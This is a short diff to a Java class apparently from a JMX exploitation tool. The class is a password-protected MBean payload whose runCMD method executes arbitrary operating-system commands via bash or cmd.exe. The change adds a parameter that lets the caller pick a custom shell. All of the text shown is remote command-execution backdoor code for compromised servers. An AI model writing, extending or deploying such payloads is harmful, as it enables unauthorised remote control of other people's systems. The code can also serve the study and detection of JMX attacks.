@@ -16,7 +16,7 @@ public class MogwaiLabsPayload implements MogwaiLabsPayloadMBean {
 	}
 	
 	@Override
-	public String runCMD(String passwd, String cmd) {
+	public String runCMD(String passwd, String cmd, String shell) {
 
 		
 		if (passwd.equals(this.password) == false)  {
@@ -27,8 +27,13 @@ public class MogwaiLabsPayload implements MogwaiLabsPayloadMBean {
 			
 			
 			String[] full_cmd;
-
-			if(System.getProperty("line.separator").equals("\n"))
+			String[] sh;
+			
+			if(shell != null) {
+				sh =  shell.split(" ");
+				full_cmd = new String[] {sh[0], sh[1], cmd};
+			}
+			else if(System.getProperty("line.separator").equals("\n"))
 				full_cmd = new String[]{"bash","-c",cmd};
 			else // Assumes win
 				full_cmd = new String[]{"cmd.exe","/c",cmd};
